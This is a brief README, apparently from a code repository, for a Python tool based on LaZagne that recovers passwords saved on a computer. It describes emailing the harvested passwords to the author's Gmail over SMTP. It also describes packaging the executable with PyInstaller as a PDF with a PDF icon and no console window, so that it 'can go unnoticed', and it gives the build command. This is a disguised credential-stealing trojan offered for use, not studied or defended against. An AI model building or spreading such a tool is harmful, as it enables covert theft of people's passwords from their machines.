# lazagne
python script for password recovery on the system.(It's cross-platform).

Based off of [AlessandroZ](https://github.com/AlessandroZ/LaZagne) credential recovery project. That let's you access passwords saved on a particular computer.

using the SMTP module i can have the password sent to my gmail.

Much safer to use linux distrubution such as the Kali linux

On the Kali linux:

`pip install PyInstaller `

Pyinstaller enables you to wrap the lazagne.exe into a pdf document so that it can go unnoticed.
The pdf should be wrapped with a pdf icon image.



`python -m PyInstaller --add-data 'sample.pdf:. --onefile --noconsole --icon image.ico download.py'`


